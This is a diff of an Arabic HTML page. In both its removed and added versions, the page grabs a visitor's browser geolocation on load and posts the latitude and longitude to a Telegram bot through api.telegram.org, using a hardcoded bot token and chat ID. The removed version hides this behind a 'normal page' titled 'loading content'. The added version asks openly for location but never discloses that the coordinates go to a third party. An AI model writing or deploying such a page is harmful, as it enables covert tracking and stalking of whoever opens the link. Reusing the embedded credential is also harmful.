@@ -2,76 +2,62 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>صفحة عادية</title>
+  <title>مشاركة الموقع</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f0f0f0;
       text-align: center;
       padding: 50px;
     }
-    .content {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      max-width: 500px;
-      margin: 0 auto;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    p {
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
       color: #333;
-      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <div class="content">
-    <h2>مرحباً</h2>
-    <p>جاري تحميل المحتوى...</p>
-    <p id="status" style="font-size: 14px; color: #666;"></p>
-  </div>
+  <h2>سيتم طلب مشاركة موقعك تلقائياً</h2>
+  <p id="status"></p>
 
   <script>
     const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
     const CHAT_ID = "6024837142";
 
-    function sendLocationToBot(lat, lon) {
+    function sendLocation(lat, lon) {
       const message = `📍 تم الحصول على الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
       
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .then(response => {
-          if (response.ok) {
-            console.log('تم الإرسال للبوت بنجاح');
-          }
-        })
-        .catch(error => console.error('خطأ في الإرسال:', error));
+        .then(response => console.log('تم الإرسال'))
+        .catch(error => console.error('خطأ:', error));
     }
 
-    function getLocation() {
+    function updateStatus(text, isError = false) {
       const status = document.getElementById('status');
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            status.innerHTML = `تم التحميل بنجاح`;
-            sendLocationToBot(lat, lon);
-          },
-          (error) => {
-            console.log('رفض المستخدم مشاركة الموقع أو حدث خطأ:', error);
-            status.innerHTML = 'يرجى السماح بالوصول إلى الموقع';
-          }
-        );
-      } else {
-        status.innerHTML = 'المتصفح لا يدعم خدمة تحديد الموقع.';
-      }
+      status.innerHTML = text;
+      if (isError) status.style.color = 'red';
+      else status.style.color = 'green';
     }
 
-    // طلب الموقع تلقائياً عند تحميل الصفحة
-    window.addEventListener('load', function() {
-      setTimeout(getLocation, 500);
-    });
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          updateStatus(`✓ تم تحديد موقعك بنجاح`);
+          sendLocation(lat, lon);
+        },
+        (error) => {
+          if (error.code === 1) {
+            updateStatus('✗ يرجى السماح بالوصول إلى الموقع', true);
+          } else {
+            updateStatus('✗ حدث خطأ في تحديد الموقع', true);
+          }
+        }
+      );
+    } else {
+      updateStatus('✗ المتصفح لا يدعم تحديد الموقع', true);
+    }
   </script>
 </body>
 </html>
